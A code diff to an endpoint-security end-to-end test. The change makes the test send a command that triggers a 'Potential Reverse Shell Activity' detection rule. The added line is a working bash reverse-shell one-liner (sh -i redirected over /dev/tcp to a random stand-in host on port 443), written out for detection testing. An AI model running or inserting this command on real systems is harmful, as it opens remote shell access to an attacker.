@@ -56,10 +56,12 @@ describe('Endpoint generated alerts', { tags: ['@ess', '@serverless'] }, () => {
   });
 
   it('should create a Detection Engine alert from an endpoint alert', () => {
-    // Triggers a Malicious Behaviour alert on Linux system (`grep *` was added only to identify this specific alert)
-    const executeMaliciousCommand = `bash -c cat /dev/tcp/foo | grep ${Math.random()
+    // Triggers a Malicious Behaviour alert on Linux system (the `/dev/tcp` reverse-shell
+    // redirect matches the "Potential Reverse Shell Activity via TCP/UDP Socket" endpoint rule;
+    // the random host segment is added only to identify this specific alert)
+    const executeMaliciousCommand = `bash -c sh -i >& /dev/tcp/${Math.random()
       .toString(16)
-      .substring(2)}`;
+      .substring(2)}/443 0>&1`;
 
     // Send `execute` command that triggers malicious behaviour using the `execute` response action
     request<ResponseActionApiResponse>({
